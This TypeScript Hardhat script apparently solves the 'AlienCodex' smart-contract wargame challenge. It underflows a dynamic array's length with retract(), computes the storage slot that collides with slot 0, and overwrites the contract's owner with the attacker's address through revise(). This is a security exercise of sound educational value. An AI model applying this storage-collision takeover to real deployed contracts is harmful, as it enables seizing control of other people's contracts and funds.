import { ethers } from "hardhat";
import { AlienCodex__factory } from "../typechain-types";

async function main() {
  let [deployer] = await ethers.getSigners();

  console.log(deployer.address);
  let tx;

  let contract = "0x629358c3b96dDFe908F8A6E24090f0cC83a9C0E2";

  let alien = new AlienCodex__factory(deployer).attach(contract);
  console.log(13);
  await alien.make_contact();

  console.log(15);
  // set array to max length
  await alien.retract();

  let arraySlot = ethers.BigNumber.from(
    ethers.utils.keccak256(
      "0x0000000000000000000000000000000000000000000000000000000000000001"
    )
  );

  console.log(await alien.owner());

  let max_uint = ethers.constants.MaxUint256;

  // add 1 at the end for overflow emulation
  let collidingSlot = max_uint.sub(arraySlot).add(1);

  await alien.revise(
    collidingSlot.toString(),
    ethers.utils.hexZeroPad(deployer.address, 32),
    { gasLimit: 400_000 }
  );

  console.log(await alien.owner());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
